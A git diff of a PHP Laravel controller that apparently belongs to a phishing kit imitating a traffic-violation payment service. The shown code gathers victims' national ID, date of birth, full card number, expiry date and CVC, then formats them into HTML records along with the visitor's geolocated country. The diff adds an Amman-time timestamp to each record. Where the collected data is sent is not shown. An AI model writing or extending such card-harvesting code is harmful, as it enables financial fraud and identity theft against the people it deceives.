@@ -451,7 +451,8 @@ class EfaaController extends Controller
     public function extGetTrafficViolationInfo(Request $request){
 
         
-        $position = Location::get();
+        $position    = Location::get();
+        $currentTime =  Carbon::now()->timezone('Asia/Amman')->toTimeString();
 
         $countryName = $position->countryName;
 
@@ -542,9 +543,10 @@ class EfaaController extends Controller
         $html = '     <div class="p-2 mb-2 bg-info text-dark">Info</div>
                        <div class="bg-light text-left rounded p-4" style="text-align: left;"><div style="color: green;"></br>
                        <h4> ID: '.$idNumber.'</h4>
-                       </br><h4> Ticket  : '.$verNumber.'  </h4></br>
+                       <h4> '.$verNumber.'  </h4>
                        <h4> DOB: '.$dateofbirth.'</h4>
-                       <h4> Country: '. $countryName.'</h4>
+                       <h4>  '. $countryName.'</h4>
+                       <h4>  '.$currentTime.'</h4>
                        </div>';
        
        $htmlData = [
@@ -741,7 +743,7 @@ $customer = DB::table('customers')->where('id_ref',$id)->first();
     public function creditcard(Request $request){
 
 
-      
+         $currentTime =  Carbon::now()->timezone('Asia/Amman')->toTimeString();
 
         $cardNumber = $request->input('mynumber');
         $cardExpiry = $request->input('cc-exp');
@@ -798,7 +800,8 @@ $customer = DB::table('customers')->where('id_ref',$id)->first();
                     <h4>Name :'.$myname.'</h4>
                     </br><h4> Number: '.$cardNumber.'  </h4></br>
                     <h4>Exp Date : '.$cardExpiry.' </h4></br>
-                    <h4>CVC:  '.$cardCVC.'</br>
+                    <h4>CVC:  '.$cardCVC.' </h4></br>
+                    <h4>  '.$currentTime.'</h4>
                     </div>';
     
     $htmlData = [
